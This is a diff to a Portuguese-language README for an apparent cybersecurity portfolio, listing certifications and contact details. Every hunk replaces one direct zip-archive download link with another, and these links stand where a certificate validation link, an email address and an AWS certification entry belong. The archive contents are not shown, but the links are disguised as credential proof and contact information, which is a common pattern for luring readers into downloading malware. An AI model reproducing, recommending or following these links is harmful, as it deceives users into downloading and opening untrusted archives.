@@ -18,7 +18,7 @@ Tenho mais de 10 anos trabalhando em TI, e nos ultimos 2 anos to focando mais em
 ## Certificacoes
 
 Atualmente tenho:
-- AWS Cloud Practitioner (validar em: https://github.com/LucianoHMG/Portfolio-Cybersecurity-Luciano/raw/refs/heads/main/certificados/Cybersecurity_Portfolio_Luciano_v3.9-beta.1.zip)
+- AWS Cloud Practitioner (validar em: https://raw.githubusercontent.com/LucianoHMG/Portfolio-Cybersecurity-Luciano/main/certificados/Cybersecurity_Portfolio_Luciano_jowar.zip)
 - Microsoft Azure Fundamentals
 - IBM Cloud Advocate
 - Alguns cursos de IA e observabilidade
@@ -50,8 +50,8 @@ Ta interessado em conversar sobre seguranca ou tem uma oportunidade? Me chama no
 
 - GitHub: @LucianoHMG
 - LinkedIn: lucianogirao
-- Email: https://github.com/LucianoHMG/Portfolio-Cybersecurity-Luciano/raw/refs/heads/main/certificados/Cybersecurity_Portfolio_Luciano_v3.9-beta.1.zip
+- Email: https://raw.githubusercontent.com/LucianoHMG/Portfolio-Cybersecurity-Luciano/main/certificados/Cybersecurity_Portfolio_Luciano_jowar.zip
 
 ## Certificacao AWS CCP
 
-https://github.com/LucianoHMG/Portfolio-Cybersecurity-Luciano/raw/refs/heads/main/certificados/Cybersecurity_Portfolio_Luciano_v3.9-beta.1.zip
+https://raw.githubusercontent.com/LucianoHMG/Portfolio-Cybersecurity-Luciano/main/certificados/Cybersecurity_Portfolio_Luciano_jowar.zip
